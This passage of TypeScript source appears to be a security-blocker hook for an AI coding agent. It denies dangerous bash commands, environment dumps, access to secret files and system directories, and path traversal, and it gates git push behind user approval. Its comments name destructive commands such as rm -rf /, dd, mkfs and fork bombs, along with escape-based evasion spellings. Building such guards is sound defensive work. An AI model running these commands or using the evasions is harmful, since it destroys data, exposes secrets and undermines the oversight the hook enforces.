  // Ambiguity leaves text SCANNABLE rather than granting permission: at whole-
  // command scope (unbalanced quotes, a group-bound pipe, a thrown error) the
  // raw command comes back untouched; at segment scope (substitution, redirect,
  // piped stdout) that segment is skipped while others keep their blanking. The
  // guarantee is per-region, not "cannot under-block" — see the module header
  // in lib/shell-projection.ts, which records the three false negatives review
  // found and why that stronger claim was withdrawn.
  const scannable = scannableProjection(command);

  // Secret-bearing files: any reference, read included.
  for (const pattern of BASH_SECRET_PATTERNS) {
    if (pattern.test(scannable)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  // System directories: ANY reference, read included. (Said "only when targeted
  // by a mutating operation" until #99 — that gate does not exist; see the
  // function's docstring.)
  return matchesSystemDirMutation(scannable);
}

/**
 * Validate a bash command for dangerous operations.
 *
 * @param command - The bash command to validate
 * @param sessionId - Session ID for logging
 * @returns HookResult - deny if dangerous, silent success otherwise
 */
function validateBashCommand(
  command: string,
  sessionId: string,
  agentContext?: AgentContext
): HookResult {
  // Normalize backslash escapes to prevent bypass (CC v2.1.98 alignment)
  // e.g., rm \-rf / → rm -rf /, r\m -rf / → rm -rf /
  // Then normalize $HOME/${HOME} → ~ so home-targeting deny patterns match
  // both spellings (CC v2.1.162 alignment).
  const normalized = normalizeHomeRefs(normalizeBashEscapes(command));

  // Unwrap exec wrappers so nested dangerous commands are caught
  // (CC v2.1.113 alignment — sh -c '...', bash -c '...', env VAR=x cmd).
  // Check BOTH raw and unwrapped forms: raw catches wrappers that are
  // themselves dangerous (e.g. literal "env" dump), unwrapped catches
  // the payload they might be hiding.
  const unwrapped = unwrapExecWrappers(normalized);
  const candidates = unwrapped === normalized ? [normalized] : [normalized, unwrapped];

  // Check for dangerous command patterns first (categorized registry walk).
  // Surfaces the human-readable description so users see WHY their command
  // was blocked, not just the cryptic regex source.
  for (const candidate of candidates) {
    const match: DangerousBashMatch | null = matchDangerousBash(candidate);
    if (match) {
      // Pattern kept in the LOG. It was removed from the model-facing payload
      // (#65), and on this path it was previously recoverable from nowhere else
      // — so removing it there without adding it here would have destroyed the
      // information rather than relocating it.
      const reason = `Dangerous command detected (${match.pattern.category}): ${match.pattern.description}. Pattern: ${match.pattern.regex.source}`;
      logWarn(HOOK_NAME, `Blocked: ${reason}`);
      logPermission('deny', reason, 'Bash', sessionId, agentContext);
      return outputDeny(
        `BLOCKED: Dangerous command detected.\n\nCategory: ${match.pattern.category}\nReason: ${match.pattern.description}${DENIAL_GUIDANCE}`
      );
    }
  }

  // Check for environment dump commands
  for (const candidate of candidates) {
    const envDumpMatch = matchesEnvDumpCommand(candidate);
    if (envDumpMatch.matched) {
      const reason = `Environment dump command detected. Pattern: ${envDumpMatch.pattern}`;
      logWarn(HOOK_NAME, `Blocked: ${reason}`);
      logPermission('deny', reason, 'Bash', sessionId, agentContext);
      return outputDeny(
        'BLOCKED: Environment dump command detected.\n\nThis command could expose secrets stored in environment variables.\nIf you need a specific variable, use: echo $VARIABLE_NAME'
      );
    }
  }

  // Check for sensitive file patterns in command
  for (const candidate of candidates) {
    const sensitiveMatch = matchesBashSensitivePattern(candidate);
    if (sensitiveMatch.matched) {
      const reason = `Command references sensitive file or directory. Pattern: ${sensitiveMatch.pattern}`;
      logWarn(HOOK_NAME, `Blocked: ${reason}`);
      logPermission('deny', reason, 'Bash', sessionId, agentContext);
      return outputDeny(
        `BLOCKED: Command references protected resource.\n\nProtected resources include environment files, system directories, and key material.${DENIAL_GUIDANCE}`
      );
    }
  }

  // Approval-first gate for `git push` — forces a user permission prompt.
  const pushGateResult = checkGitPushGate(candidates, sessionId, agentContext);
  if (pushGateResult) return pushGateResult;

  // Command is safe
  return outputSilentSuccess();
}

/**
 * Approval-first gate for `git push`.
 *
 * For any `git push` invocation (other than `--help`), forces a user
 * permission prompt regardless of auto-approve rules. Escape hatch:
 * set `CLAUDE_AUTO_APPROVE_PUSH=1` for solo / automation flows.
 *
 * Returns null when no gate applies (caller proceeds with normal flow).
 * Returns an ask-decision HookResult when the gate fires.
 */
function checkGitPushGate(
  candidates: readonly string[],
  sessionId: string,
  agentContext?: AgentContext
): HookResult | null {
  for (const candidate of candidates) {
    if (!matchesGitPush(candidate)) continue;
    if (process.env['CLAUDE_AUTO_APPROVE_PUSH'] === '1') {
      logDebug(HOOK_NAME, 'git push auto-approved via CLAUDE_AUTO_APPROVE_PUSH=1');
      return null;
    }
    logDebug(
      HOOK_NAME,
      `git push routed to user approval [session=${sessionId}, agent=${agentContext?.agentType ?? 'none'}]`
    );
    return outputAsk();
  }
  return null;
}

// =============================================================================
// FILE PATH VALIDATION
// =============================================================================

/**
 * Check if a path matches any protected pattern.
 * Returns the category and pattern if matched.
 *
 * @param pathToCheck - The path to check against protected patterns
 * @returns ProtectedPathMatch with category and pattern if matched
 */
export function matchesProtectedPath(pathToCheck: string): ProtectedPathMatch {
  for (const config of PATTERN_CHECKS) {
    for (const pattern of config.patterns) {
      if (pattern.test(pathToCheck)) {
        return {
          matched: true,
          category: config.category,
          pattern: pattern.source,
        };
      }
    }
  }
  return { matched: false };
}

/**
 * Get the friendly name for a protection category.
 *
 * @param category - The protection category
 * @returns Human-readable name for the category
 */
function getCategoryFriendlyName(category: ProtectionCategory): string {
  const config = PATTERN_CHECKS.find((c) => c.category === category);
  return config?.friendlyName ?? category;
}

/**
 * Validate a file operation for protected paths.
 *
 * SECURITY: Checks BOTH normalized AND resolved paths to prevent bypasses.
 * The resolved path catches symlink attacks (ME-001) where a symlink inside
 * the project points to a protected file outside.
 *
 * @param filePath - The file path from the tool input
 * @param toolName - The tool being used (for logging)
 * @param sessionId - Session ID for logging
 * @returns HookResult - deny if protected, silent success otherwise
 */
function validateFileOperation(
  filePath: string,
  toolName: ToolName,
  sessionId: string,
  agentContext?: AgentContext
): HookResult {
  // Normalize path for pattern matching
  const normalizedPath = normalizePath(filePath);

  logDebug(HOOK_NAME, `Normalized path: ${normalizedPath}`);

  // Check for path traversal attempts
  // After normalization, if '..' remains, it's escaping the current directory
  if (normalizedPath.includes('..')) {
    const reason = `Path traversal detected in: ${filePath}`;
    logWarn(HOOK_NAME, `Blocked: ${reason}`);
    logPermission('deny', reason, toolName, sessionId, agentContext);
    return outputDeny(
      `BLOCKED: Path traversal detected.\n\nThe path contains '..' which could be a security bypass attempt.\nPath: ${filePath}`
    );
  }

  // SECURITY: Resolve symlinks (ME-001 fix)
  // A symlink inside the project could point to /etc/passwd or other protected files
  // CC<2.1.88 compat: filePath is now always absolute; symlink resolution still critical
  const realPath = resolveRealPath(filePath);
  logDebug(HOOK_NAME, `Resolved path: ${realPath}`);

  // Check BOTH paths against all protected patterns
  // This catches both direct access and symlink bypasses
  const pathsToCheck = [normalizedPath, realPath];

  for (const checkPath of pathsToCheck) {
    const match = matchesProtectedPath(checkPath);
    if (match.matched && match.category) {
      const friendlyName = getCategoryFriendlyName(match.category);
      // Pattern kept in the LOG — see the note on the dangerous-command path.
      const reason = `${friendlyName} modification blocked. File: ${filePath} (resolved: ${realPath}). Pattern: ${match.pattern}`;
      logWarn(HOOK_NAME, `Blocked: ${reason}`);
      logPermission('deny', reason, toolName, sessionId, agentContext);
      return outputDeny(
        `BLOCKED: ${friendlyName} modification blocked.\n\n` +
          `File: ${filePath}\n` +
          `Category: ${friendlyName}${DENIAL_GUIDANCE}`
      );
    }
  }

  // File operation is safe
  return outputSilentSuccess();
}

// =============================================================================
// AGENT CONTEXT HELPERS
// =============================================================================

/**
 * Extract agent context from hook input for audit logging.
 */
function extractAgentContext(input: HookInput): AgentContext | undefined {
  const agentId = getAgentId(input);
  const agentType = getAgentType(input);
  return agentId || agentType ? { agentId, agentType } : undefined;
}

/**
 * Format agent context for debug logging.
 */
function formatAgentDebug(toolName: ToolName, ctx: AgentContext | undefined): string {
  let msg = `Tool=${toolName}`;
  if (ctx?.agentType) msg += ` agent_type=${ctx.agentType}`;
  if (ctx?.agentId) msg += ` agent_id=${ctx.agentId}`;
  return msg;
}

// =============================================================================
// MAIN HOOK FUNCTION
// =============================================================================

/**
 * Security blocker hook - prevents dangerous operations.
 *
 * This hook is the last line of defense against:
 * - Dangerous bash commands (rm -rf /, dd, mkfs, fork bombs)
 * - Modification of sensitive files (.env, .ssh keys, credentials)
 * - Modification of system directories (/etc, /usr, /var)
 * - Path traversal attacks (..)
 * - Symlink bypass attacks (ME-001)
 *
 * For Bash tool:
 * 1. Checks dangerous command patterns (rm -rf /, dd, mkfs, fork bombs)
 * 2. Checks sensitive file patterns in commands (.env, /etc/, .ssh/)
 * 3. Blocks with deny if match found
 * 4. Allows (silent success) if no match
 *
 * For Write/Edit/MultiEdit tools:
 * 1. Normalizes path (remove ./, collapse //)
 * 2. Checks for path traversal (..)
 * 3. Resolves symlinks (ME-001 CRITICAL)
 * 4. Checks BOTH normalized AND resolved paths against protected patterns
 * 5. Blocks with deny if match found
 * 6. Allows (silent success) if no match
 *
 * For other tools:
 * - Returns silent success (allows by default)
 *
 * @param input - Hook input from Claude Code
 * @returns HookResult with deny decision if blocked, silent success otherwise
 */
export async function securityBlocker(input: HookInput): Promise<HookResult> {
  const toolName = getToolName(input);
  const sessionId = getSessionId(input);
  const agentCtx = extractAgentContext(input);

  logDebug(HOOK_NAME, formatAgentDebug(toolName, agentCtx));

  // Handle Bash commands
  if (toolName === 'Bash') {
    // Warn when sandbox is explicitly disabled (v2.0.24)
    if (input.tool_input.dangerouslyDisableSandbox === true) {
      logWarn(
        HOOK_NAME,
        `Sandbox disabled via dangerouslyDisableSandbox flag [session=${sessionId}]`
      );
    }

    const rawCommand = getCommand(input);
    const command = rawCommand ? stripProxyPrefix(rawCommand) : undefined;
    if (command) {
      const result = validateBashCommand(command, sessionId, agentCtx);
      // If the command itself is safe but sandbox is disabled, append a warning
      if (result.continue && input.tool_input.dangerouslyDisableSandbox === true) {
        return outputWarning(
          'Bash sandbox is disabled (dangerouslyDisableSandbox=true). Command will run without sandbox restrictions.'
        );
      }
      return result;
    }
    // Empty command - allow (will be handled by Claude Code)
    return outputSilentSuccess();
  }

  // Handle file write operations
  if (FILE_WRITE_TOOLS.has(toolName)) {
    const filePath = getFilePath(input);
    if (filePath) {
      return validateFileOperation(filePath, toolName, sessionId, agentCtx);
    }
    // Empty path - allow (will be handled by Claude Code)
    return outputSilentSuccess();
  }

  // For other tools (Read, Glob, Grep, etc.), allow by default
  logDebug(HOOK_NAME, `Tool ${toolName} allowed by default`);
  return outputSilentSuccess();
}

// =============================================================================
// EXPORTS
// =============================================================================

export { HOOK_NAME };
export default securityBlocker;
